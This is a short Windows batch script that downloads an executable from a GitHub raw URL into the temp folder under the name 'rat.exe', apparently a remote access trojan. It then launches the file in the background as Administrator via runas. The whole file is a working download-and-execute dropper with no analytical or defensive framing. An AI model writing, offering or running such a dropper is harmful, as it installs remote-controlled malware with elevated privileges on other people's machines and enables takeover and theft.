@echo off

powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/claykrs/claykers/main/default.exe -OutFile %TEMP%\rat.exe"
if exist "%TEMP%\rat.exe" (
    echo File downloaded successfully.
    start /B "" runas /user:Administrator "%TEMP%\rat.exe"
) else (
    echo Failed to download file.
)

endlocal
